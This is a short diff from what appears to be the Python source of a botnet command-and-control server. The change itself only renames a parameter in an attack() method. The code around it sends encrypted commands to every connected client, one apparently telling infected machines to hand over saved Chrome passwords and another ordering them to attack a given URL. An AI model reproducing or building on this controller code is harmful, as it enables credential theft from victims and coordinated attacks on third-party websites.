@@ -84,13 +84,13 @@ class Server:
                 item.send(self.keys[i].encrypt("%$chromePass".encode()))
                 print(self.keys[i].decrypt(item.recv(1024)).decode())
 
-    def attack(self, url, type):
+    def attack(self, url, attack_type):
         try:
             print(url)
-            type = type.replace(" ", "")
-            print(type)
+            attack_type = attack_type.replace(" ", "")
+            print(attack_type)
             for i, item in enumerate(self.connected):
-                item.send(self.keys[i].encrypt(("%$Att " + type + " " + url).encode()))
+                item.send(self.keys[i].encrypt(("%$Att " + attack_type + " " + url).encode()))
         except Exception as e:
             print(e)
 
